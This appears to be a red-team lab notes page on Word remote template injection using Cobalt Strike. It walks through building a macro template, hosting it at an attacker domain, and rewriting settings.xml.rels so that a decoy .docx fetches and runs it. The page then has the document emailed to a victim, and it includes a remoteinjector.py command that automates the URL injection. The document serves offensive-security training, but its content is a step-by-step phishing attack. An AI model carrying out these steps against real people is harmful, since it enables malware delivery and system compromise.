---
description: 09/02/2025
---

# Remote Template Injection

## What is it?

**Microsoft Word includes a feature** that allows users to create documents linked to **templates**. _<mark style="color:red;">These templates can be stored locally or retrieved from a remote server whenever the document is accessed</mark>_.

Exploiting this functionality, attackers can host malicious Word Template files (`.dotm`) on their servers, embedding harmful macros within them. When a victim opens a Word document, it automatically fetches the malicious template from the attacker's server and executes the embedded code, potentially compromising the victim's system.&#x20;

The key benefit of this technique is that the decoy Word document reaching the victim's system appears harmless.&#x20;

This technique is known as _**Living off the Land**_ (**LotL**).&#x20;

## Creating a Malicious Word Template

1. Open Microsoft Word
2. Create a new blank document and insert a desired macro
3. Save to `C:\Payloads` along with the rest of your payloads as a _**Word 97-2003 Template**_ (`*.dot`) file
4. This will now serve as our "malicious remote template"
5. Use Cobalt Strike to host this file at your attacker-controlled domain, in this case, `http://nickelviper.com/template.dot`
6. Now create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Template`, adding any content you want, then save to `C:\Payloads` as a new `.docx` file.&#x20;
7. Browse to the directory in file explorer, right-click, and select `7-zip` > Open archive
8. Navigate to Word -> \_rels, right-click on `settings.xml.rels` and select **Edit**.&#x20;
9. This is just a small little `XML` file. Scroll until you see the `Target` entry:

```
Target="file:///C:\Users\Attacker\Documents\Custom%20Office%20Templates\Blank%20Template.dotx"
```

10. You're going to notice that it is currently pointing to the template on our local disk from which the document was created. Simply modify this so that it points to the template URL instead:

```
Target="http://nickelviper.com/template.dot"
```

11. Save those changes and email the document to Bob.
12. Once the file is opened, you'll see a warning about macros again, but allowing them to run will execute the macro in the hosted template, giving us a Beacon.

## Automation?

Check out this [Python tool](https://github.com/JohnWoodman/remoteinjector) that automates this process so that we do not have to modify the XML manually.

```
ubuntu@DESKTOP-3BSK7NO ~> python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
URL Injected and saved to /mnt/c/Payloads/document_new.docx
```

## Observing Web Log Beacon Activity&#x20;

Inside of Cobalt Strike, you can go to _**View -> Web Log**_, and from there you can view any/all activity of your malicious templates.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
